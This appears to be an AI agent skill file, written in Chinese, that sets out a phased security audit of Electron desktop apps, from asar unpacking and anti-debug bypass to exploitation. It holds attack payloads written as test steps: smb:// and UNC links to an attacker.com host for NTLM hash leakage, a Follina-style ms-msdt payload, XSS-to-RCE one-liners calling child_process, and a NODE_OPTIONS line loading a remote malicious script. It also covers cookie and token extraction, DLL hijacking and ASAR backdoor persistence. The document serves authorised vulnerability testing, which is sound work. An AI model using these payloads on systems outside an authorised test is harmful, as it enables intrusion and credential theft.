---
name: electron-audit
description: Electron 桌面应用全攻击面安全审计。从 asar 解包、DevTools 强开与反调试绕过开始，到 JS Bridge 利用、协议处理器 RCE、XSS→RCE 链、Fuse 滥用、DLL 劫持、本地数据窃取的完整渗透流程。每个漏洞点给出可复现的 PoC。
  TRIGGER when: 用户提到 Electron 安全审计、Electron 漏洞挖掘、asar 解包分析、Electron 应用渗透、桌面应用安全测试，或要求检查 Electron 应用的安全配置、敏感信息泄露、XSS、RCE、伪协议、JS Bridge、DLL 劫持等。包括"审计这个 Electron 应用"、"扫一下这个桌面程序"、"看看这个 asar 有没有问题"、"Electron 安全检查"。
  DO NOT TRIGGER when: 用户只是想开发 Electron 应用、打包 Electron、或处理非安全相关的 Electron 问题。
argument-hint: [Electron 应用路径或 asar 文件路径]
---

# Electron 全攻击面安全审计

对 **$ARGUMENTS** 执行完整渗透式安全审计。

**目标**: 系统化发现 Electron 应用中的**可复现、可验证的高风险安全漏洞**，每个漏洞点提供 PoC。

---

## 漏洞分级标准

| 等级 | CVSS 3.1 | 定义 | 典型场景 |
|:-----|:---------|:-----|:---------|
| **严重 (C)** | 9.0-10.0 | 无需交互即可 RCE，或无条件窃取用户凭证 | nodeIntegration:true + XSS → `require('child_process').exec()` |
| **高危 (H)** | 7.0-8.9 | 需少量交互的 RCE，或大量敏感数据泄露 | shell.openExternal 无校验 → 任意程序执行 |
| **中危 (M)** | 4.0-6.9 | 受限的代码执行或信息泄露 | CSP 缺失 + contextBridge 暴露面过大 |
| **低危 (L)** | 0.1-3.9 | 信息泄露但无直接利用路径 | Source Map 泄露、内部 API 端点暴露 |

- 漏洞编号格式: `{C/H/M/L}-ELECTRON-{序号}`
- 可利用性评估: 每个漏洞必须标注 **已验证** / **待验证** / **理论可行**

---

## 检测范围边界

**本技能检测范围仅包含以下类型：**
- ✅ 远程代码执行 (RCE) — XSS→RCE、协议处理器 RCE、shell.openExternal 滥用
- ✅ JS Bridge 利用 — contextBridge 暴露面、IPC 通道注入、preload 逃逸
- ✅ 客户端二进制攻击 — Fuse 滥用、DLL 劫持、ASAR 篡改
- ✅ 敏感数据泄露 — 本地存储明文凭证、日志泄露、源码泄露
- ✅ 安全配置缺陷 — nodeIntegration/contextIsolation/sandbox/CSP/webSecurity
- ✅ 导航劫持 — will-navigate/will-redirect 缺失、loadURL 注入
- ✅ 反调试绕过 — DevTools 检测绕过、debugger 循环绕过

**以下不属于本技能检测范围：**
- ❌ 业务逻辑漏洞（除非直接导致 RCE）
- ❌ 服务端漏洞（API 接口安全由专项工具处理）
- ❌ 代码质量问题（命名、风格、性能）
- ❌ 合规性检查（GDPR、隐私政策）

---

## 核心要求

**此技能必须对每个攻击面执行完整检测，不允许省略。**

- ✅ 每个漏洞提供可复现的 PoC 或验证步骤
- ✅ 每个高危以上漏洞进行数据流分析（Source → Sink）
- ✅ 区分「已验证」和「待验证」漏洞
- ✅ 所有发现按风险等级排序
- ❌ 禁止只列理论风险不给验证方法
- ❌ 禁止跳过 DevTools 强开步骤
- ❌ 禁止忽略 .jsc 文件（标记为不可审计项，运行时再分析）

---

## 审计分层模型

```
Phase 0: 侦察与防御绕过
  ├── 0A. 保护机制识别（Fuses / ASAR 校验 / bytenode / 混淆）
  └── 0B. DevTools 强开 + 反调试绕过（必须完成才能进入后续阶段）

Phase 1: 静态分析（无需运行应用）
  ├── 1A. asar 解包 + 敏感信息扫描
  ├── 1B. 安全配置审计（webPreferences / CSP / Fuses）
  └── 1C. 代码漏洞面定位（XSS Sink / IPC Handler / 协议 Handler）

Phase 2: 攻击链构造（需要运行应用）
  ├── 2A. JS Bridge 利用（contextBridge / IPC / preload 逃逸）
  ├── 2B. 协议处理器 + shell.openExternal → RCE
  ├── 2C. XSS → RCE 完整链
  └── 2D. 导航劫持 + 远程内容加载

Phase 3: 客户端二进制攻击
  ├── 3A. Fuse 滥用（RunAsNode / --inspect / NODE_OPTIONS）
  ├── 3B. DLL 劫持检测
  └── 3C. ASAR 篡改持久化

Phase 4: 本地数据窃取
  ├── 4A. Cookie / LocalStorage / IndexedDB 提取
  ├── 4B. 日志文件敏感信息
  └── 4C. 缓存与临时文件分析

Phase 5: 供应链与版本风险
  ├── 5A. NPM 依赖 CVE 扫描
  ├── 5B. Electron/Chromium 版本 → 已知 1-day
  └── 5C. 自动更新机制 MITM
```

**每个 Phase 独立可执行，按顺序推进。发现高危以上问题立即报告。**

---

## Phase 0: 侦察与防御绕过

**目标**: 识别保护机制，确保 DevTools 稳定可用。DevTools 是后续所有运行时分析的前提。

### 0A. 保护机制识别

```
1. 定位应用文件:
   - 找到 exe/app 可执行文件
   - 找到 resources/app.asar（或 app/ 目录）
   - 检查是否存在 resources/app.asar.unpacked/

2. 检查 Electron Fuses:
   npx @electron/fuses read path/to/electron.exe
   重点关注:
   - RunAsNode              → on = 可用 ELECTRON_RUN_AS_NODE 直接 RCE
   - EnableNodeCliInspectArguments → on = 可用 --inspect 附加调试器
   - EnableEmbeddedAsarIntegrityValidation → on = 修改 asar 后会崩溃
   - OnlyLoadAppFromAsar    → off = 可用目录替换 asar

3. 识别代码保护类型:
   - .jsc 文件 → bytenode 编译，静态不可审计，运行时处理
   - _0x 前缀变量 → OB 混淆，需要 ast-deobfuscate 技能
   - .wasm 文件 → WebAssembly，标记
   - 加密/压缩的 JS → 识别加密方式
```

### 0B. DevTools 强开

**详细手册**: `$SKILL_DIR/references/DEVTOOLS_BYPASS.md`

```
执行顺序（试 → 诊断 → 修 → 验证）:

1. 直接尝试:
   - F12 / Ctrl+Shift+I / Ctrl+Shift+J
   - --remote-debugging-port=9222（不修改文件，最安全）

2. 打不开？诊断原因:
   A. 快捷键被渲染进程 JS 拦截
   B. 主进程未注册 DevTools 菜单
   C. devtools-opened 事件触发 closeDevTools()
   D. ASAR 完整性校验阻止修改
   E. 反调试代码干扰

3. 注入 DevTools 强开代码（修改 main.js 顶部）

4. 绕过反调试:
   - closeDevTools() 重写
   - debugger 循环拦截
   - 窗口尺寸检测规避（undocked 模式）
   - console 重写恢复

5. 重打包并验证 DevTools 稳定可用

⚠️ 如果有 ASAR 完整性校验:
   优先方案: --remote-debugging-port=9222
   备选方案: npx @electron/fuses flip ... EnableEmbeddedAsarIntegrityValidation=off
```

**Phase 0 完成标准**: DevTools 稳定打开，Console/Network/Sources 面板均可正常使用。

---

## Phase 1: 静态分析

### 1A. 解包 + 敏感信息扫描

```
1. 解包:
   npx @electron/asar extract app.asar app_extracted/
   - 只关注 app.asar 本身，不扫描 extraResources/dll/exe

2. 敏感信息扫描:
   - 扫描规则集: $SKILL_DIR/rules/sensitive_patterns.txt
   - 用 Grep 逐类扫描，排除 node_modules/
   - 重点: API Key、JWT、数据库连接串、私钥、内网地址

3. Source Map 检查:
   - 搜索 .js.map 文件
   - 若存在，还原完整源码
   - 这是最有价值的发现之一

4. .env 和配置文件:
   - 搜索 .env / config.json / settings.json 等
   - 检查是否包含生产环境凭证
```

### 1B. 安全配置审计

**详细手册**: `$SKILL_DIR/references/CONFIG_AUDIT.md`

```
1. BrowserWindow webPreferences 检查:
   搜索: new BrowserWindow / webPreferences
   [严重] nodeIntegration: true         → XSS = 直接 RCE
   [严重] contextIsolation: false       → 原型链污染逃逸
   [高危] webSecurity: false            → 禁用 SOP，跨域 + file:// 读取
   [高危] sandbox: false（显式设置）     → 渲染进程无沙箱
   [中危] allowRunningInsecureContent   → MITM 注入

2. Preload 脚本审计:
   搜索: contextBridge.exposeInMainWorld
   [严重] 暴露 require / child_process / fs → 直接 RCE
   [严重] 暴露通用 IPC（channel 用户可控）→ 调用任意主进程功能
   [高危] 暴露 shell.openExternal（无 URL 校验）→ 任意程序执行

3. IPC 通道审计:
   搜索: ipcMain.handle / ipcMain.on
   [严重] handler 直接 exec(args.cmd) / spawn(args.program)
   [高危] handler 直接 fs.readFile(args.path) / fs.writeFile(args.path)
   [高危] handler 未做 sender 验证

4. CSP 策略:
   [高危] 无 CSP / unsafe-inline / unsafe-eval
   注意: nodeIntegration:true 时 CSP 对 require() 无效

5. Electron Fuses:
   [严重] RunAsNode=on → ELECTRON_RUN_AS_NODE=1 直接 RCE
   [高危] EnableNodeCliInspectArguments=on → --inspect 调试注入

6. 版本风险:
   Electron 版本 → Chromium 版本 → 已知 CVE
   参考: $SKILL_DIR/references/ELECTRON_CVE_DATABASE.md
```

### 1C. 代码漏洞面定位

```
用 Grep 批量扫描以下 Pattern，记录文件和行号:

[XSS Sink]
  innerHTML / outerHTML / document.write / insertAdjacentHTML
  v-html / dangerouslySetInnerHTML / $(selector).html()
  eval / Function() / setTimeout(string) / setInterval(string)

[IPC Handler]
  ipcMain.handle / ipcMain.on
  → 逐个检查 handler 内部是否有命令注入/路径穿越/代码执行

[协议 Handler]
  protocol.registerFileProtocol / protocol.handle
  app.setAsDefaultProtocolClient
  → 标记所有自定义协议入口

[危险 API 调用]
  shell.openExternal / executeJavaScript
  win.loadURL / webview (带 src 属性)
  → 检查参数是否用户可控

[导航事件]
  will-navigate / will-redirect / setWindowOpenHandler
  → 检查是否存在且校验是否严格
```

---

## Phase 2: 攻击链构造

### 2A. JS Bridge 利用

**详细手册**: `$SKILL_DIR/references/JS_BRIDGE_EXPLOIT.md`

```
此阶段需要 DevTools 可用，在 Console 中执行验证。

1. 探测暴露的 Bridge:
   在 Console 中执行全局对象枚举脚本（见手册）
   常见命名: window.electronAPI / window.api / window.bridge / window.ipc

2. 枚举 Bridge 方法:
   Object.keys(window.electronAPI).forEach(m => console.log(m, typeof window.electronAPI[m]))

3. 逐个方法测试:
   - 文件读写类: 路径穿越 → ../../etc/passwd 或 ../../../../Windows/System32/drivers/etc/hosts
   - 命令执行类: 直接注入 → ; calc 或 | calc
   - 通用 IPC 类: 枚举可用 channel → 寻找危险操作
   - URL 打开类: 注入 file:// 或 smb:// 协议

4. 如果 contextIsolation: false:
   → 原型链污染攻击（见手册 2.2 节）
   → 通过 preload 的 require 获取 child_process

每个发现的可利用方法必须提供完整 PoC。
```

### 2B. 协议处理器 + shell.openExternal → RCE

**详细手册**: `$SKILL_DIR/references/PROTOCOL_RCE.md`

```
1. 识别自定义协议:
   搜索: setAsDefaultProtocolClient / protocol.registerFileProtocol / protocol.handle
   记录协议名称（如 myapp://）

2. 协议参数注入测试:
   路径穿越:  myapp://file?path=../../../../etc/passwd
   JS 注入:   myapp://navigate?url=javascript:alert(document.cookie)
   命令注入:  myapp://run?action=;calc
   任意导航:  myapp://open?url=file:///C:/Windows/System32/

3. shell.openExternal 测试:
   搜索所有 shell.openExternal 调用
   检查参数是否经过 URL 白名单校验
   测试 Payload:
     file:///C:/Windows/System32/cmd.exe
     smb://attacker.com/share  （NTLM hash 泄露）
     \\attacker.com\share       （UNC 路径）
     ms-msdt:/id PCWDiagnostic  （Follina 类攻击）

4. 超链接 RCE:
   在聊天/评论等富文本区域输入:
     <a href="file:///C:/Windows/System32/calc.exe">click</a>
     <a href="smb://attacker.com/share">click</a>
   检查点击后是否直接打开
```

### 2C. XSS → RCE 完整链

**详细手册**: `$SKILL_DIR/references/XSS_TO_RCE.md`

```
根据 Phase 1C 定位的 XSS Sink，构造完整利用链:

场景 1: nodeIntegration: true
  <img src=x onerror="require('child_process').exec('calc')">
  → 直接 RCE，不需要任何其他条件

场景 2: contextIsolation: false + preload 有 require
  → 原型链污染逃逸 → 获取 require → RCE

场景 3: contextBridge 暴露了危险 API
  <img src=x onerror="window.electronAPI.execute('calc')">

场景 4: contextBridge 暴露了通用 IPC
  <img src=x onerror="window.electronAPI.send('shell-exec', 'calc')">

每个场景的完整 PoC 见详细手册。
```

### 2D. 导航劫持

```
1. 检查 will-navigate 监听:
   搜索: will-navigate / will-redirect / setWindowOpenHandler
   如果缺失 → 渲染进程可自由导航到恶意页面

2. 验证:
   Console 中执行: location.href = 'https://evil.com'
   如果导航成功 → 可加载恶意页面
   如果 nodeIntegration: true → 恶意页面直接 RCE

3. window.open 测试:
   Console: window.open('file:///C:/Windows/System32/')
   检查是否弹出新窗口且可访问本地文件
```

---

## Phase 3: 客户端二进制攻击

**详细手册**: `$SKILL_DIR/references/FUSE_BINARY_EXPLOIT.md`

```
3A. Fuse 滥用:

  [RunAsNode] 验证 PoC:
    set ELECTRON_RUN_AS_NODE=1
    app.exe -e "require('child_process').execSync('calc')"
    → 如果弹出计算器 = 严重漏洞

  [--inspect] 验证 PoC:
    app.exe --inspect=9229
    → 浏览器访问 chrome://inspect 连接
    → 在调试器中执行任意代码

  [NODE_OPTIONS] 验证 PoC:
    set NODE_OPTIONS=--require=\\attacker\share\malicious.js
    app.exe
    → 加载远程恶意模块

3B. DLL 劫持:
  使用 Process Monitor 监控应用启动
  筛选 "NAME NOT FOUND" 的 DLL 加载
  在应用目录放置同名恶意 DLL
  重启应用验证是否加载

3C. ASAR 篡改持久化:
  如果 OnlyLoadAppFromAsar=off 且 EnableEmbeddedAsarIntegrityValidation=off:
    解包 asar → 注入后门代码 → 重打包
    → 应用每次启动自动执行后门
```

---

## Phase 4: 本地数据窃取

**详细手册**: `$SKILL_DIR/references/LOCAL_DATA_ANALYSIS.md`

```
4A. 本地存储数据提取:

  定位数据目录:
    Windows: %APPDATA%/应用名/ 或 %LOCALAPPDATA%/应用名/
    macOS: ~/Library/Application Support/应用名/
    Linux: ~/.config/应用名/

  检查项:
    Cookies (SQLite) → sqlite3 Cookies "SELECT * FROM cookies"
      [严重] 明文 session token / JWT
    Local Storage (LevelDB) → leveldb-dump 或 DevTools Application 面板
      [高危] access_token / refresh_token / 用户密码
    IndexedDB → DevTools Application 面板
      [中危] 聊天记录 / 业务数据

4B. 日志文件:
  搜索 *.log 文件
  [高危] 日志中包含 token/密码/API Key
  [中危] 日志中包含完整 HTTP 请求（含认证头）

4C. 缓存:
  Cache/ GPUCache/ 目录
  [中危] API 响应缓存包含敏感数据
```

---

## Phase 5: 供应链与版本风险

**详细手册**: `$SKILL_DIR/references/SUPPLY_CHAIN.md`

```
5A. NPM 依赖:
  npm audit --json（需要 package-lock.json）
  重点关注: node-serialize / vm2 / lodash < 4.17.21

5B. 版本风险:
  Electron 版本 → Chromium 版本 → 已知 CVE
  参考: $SKILL_DIR/references/ELECTRON_CVE_DATABASE.md
  [严重] Chromium < 100 → 大量已知 RCE / 沙箱逃逸

5C. 自动更新:
  搜索: electron-updater / autoUpdater
  [高危] 更新服务器使用 HTTP → MITM 可注入恶意更新
  [高危] 未校验更新包签名
```

---

## 执行策略

### 整体流程

```
1. Phase 0 先行（不可跳过）
   → DevTools 必须可用才能进行后续运行时分析

2. Phase 1 静态分析
   → 完成后进入计划模式，根据发现调整后续重点
   → 发现 nodeIntegration:true → 直接构造 XSS→RCE

3. Phase 2-5 按风险优先级推进
   → 高危发现立即报告，不等全部完成
```

### Subagent 并行策略

```
Phase 1 可并行:
  - 1A 敏感信息扫描 / 1B 配置审计 / 1C 漏洞面定位（三者互不依赖）

Phase 2 可并行:
  - 2A JS Bridge / 2B 协议处理器 / 2C XSS→RCE / 2D 导航（四者互不依赖）

Phase 3 可并行:
  - 3A Fuse 滥用 / 3B DLL 劫持（互不依赖）

Phase 5 可并行:
  - 5A NPM audit / 5B 版本风险 / 5C 更新机制（互不依赖）
```

### .jsc 文件处理策略

```
.jsc 文件（bytenode 编译）无法静态分析:
  1. Phase 1 仅记录 .jsc 文件清单和位置
  2. Phase 2 通过 DevTools 运行时分析:
     - Hook 模块的 exports
     - 在 IPC 调用处设断点
     - 通过 Network 面板观察行为
  3. 不要对 .jsc 用 Grep（二进制文件）
```

---

## 反模式（CRITICAL — 每条都是过去审计踩过的坑）

| 反模式 | 后果 | 正确做法 |
|:-------|:-----|:---------|
| 跳过 Phase 0 | 遇到 ASAR 校验或反调试浪费大量时间 | 先完成侦察和 DevTools 强开 |
| 盲目扫描 .jsc | 二进制文件扫不出东西 | 标记后运行时分析 |
| 只看 main.js | 渲染进程的 webpack chunk 才是 XSS 主战场 | 搜索所有 JS 文件 |
| 忽略 Source Map | .map 文件可还原完整源码 | 发现 .map 立即还原 |
| 忽略子应用 | Electron 可内嵌其他 Electron 子应用 | 每个子应用独立审计 |
| 忽略版本 | 低版本 Chromium 有大量 1-day | 第一时间检查版本 |
| 忽略本地缓存 | %APPDATA% 下常有明文凭证 | 必查 Cookie/LevelDB |
| 只报理论风险 | 用户无法验证 | 每个高危必须给 PoC |
| 对 node_modules 做深度扫描 | 浪费时间且噪声大 | 只做 npm audit，不逐文件扫描 |

---

## 输出格式

**严格按照 `$SKILL_DIR/references/OUTPUT_TEMPLATE.md` 中的填充式模板生成报告。**

```
{应用名}_electron_audit_{YYYYMMDD_HHMMSS}.md
```

### 报告结构

```
[Electron 安全审计报告]

〇、审计概览
  应用名称 / Electron 版本 / Chromium 版本
  保护机制 / 审计范围 / DevTools 状态

一、风险统计
  X 严重 / Y 高危 / Z 中危 / W 低危

二、漏洞详情（按风险等级排序）
  每个漏洞包含:
  - 编号、等级、标题
  - 漏洞描述（Source → Sink 数据流）
  - 验证 PoC（可直接复现）
  - 影响范围
  - 修复建议

三、安全配置审计结果
四、敏感信息泄露清单
五、供应链风险
六、不可审计项（.jsc 等）
七、修复优先级建议
```

---

## 验证检查清单

**在标记审计完成前，必须逐项检查：**

### Phase 0 检查
- [ ] Electron Fuses 已读取并分析
- [ ] DevTools 稳定可用
- [ ] 保护机制已全部识别

### Phase 1 检查
- [ ] asar 已解包
- [ ] 敏感信息扫描已使用完整规则集
- [ ] 所有 BrowserWindow webPreferences 已检查
- [ ] 所有 preload 脚本已审计
- [ ] 所有 IPC handler 已审计
- [ ] CSP 策略已检查
- [ ] Electron/Chromium 版本已记录

### Phase 2 检查
- [ ] JS Bridge 暴露面已枚举并测试
- [ ] 自定义协议 handler 已审计
- [ ] shell.openExternal 所有调用点已检查
- [ ] XSS Sink 已全部扫描
- [ ] 导航事件监听已检查

### Phase 3 检查
- [ ] RunAsNode Fuse 已验证
- [ ] --inspect Fuse 已验证
- [ ] DLL 劫持风险已评估

### Phase 4 检查
- [ ] 本地存储数据已检查（Cookie/LocalStorage/IndexedDB）
- [ ] 日志文件已扫描

### 报告质量检查
- [ ] 所有高危以上漏洞有可复现的 PoC
- [ ] 所有漏洞标注了可利用性状态
- [ ] 不可审计项已明确列出
- [ ] 修复建议按优先级排序

---

## 参考资料

- [DEVTOOLS_BYPASS.md](references/DEVTOOLS_BYPASS.md) — DevTools 强开与反调试绕过
- [CONFIG_AUDIT.md](references/CONFIG_AUDIT.md) — 安全配置审计详解
- [JS_BRIDGE_EXPLOIT.md](references/JS_BRIDGE_EXPLOIT.md) — JS Bridge 利用手册
- [PROTOCOL_RCE.md](references/PROTOCOL_RCE.md) — 协议处理器与 shell.openExternal RCE
- [XSS_TO_RCE.md](references/XSS_TO_RCE.md) — XSS → RCE 攻击链
- [FUSE_BINARY_EXPLOIT.md](references/FUSE_BINARY_EXPLOIT.md) — Fuse 滥用与二进制攻击
- [LOCAL_DATA_ANALYSIS.md](references/LOCAL_DATA_ANALYSIS.md) — 本地数据窃取
- [ELECTRON_CVE_DATABASE.md](references/ELECTRON_CVE_DATABASE.md) — Electron CVE 数据库
- [OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) — 输出报告模板
- [sensitive_patterns.txt](rules/sensitive_patterns.txt) — 敏感信息扫描规则集
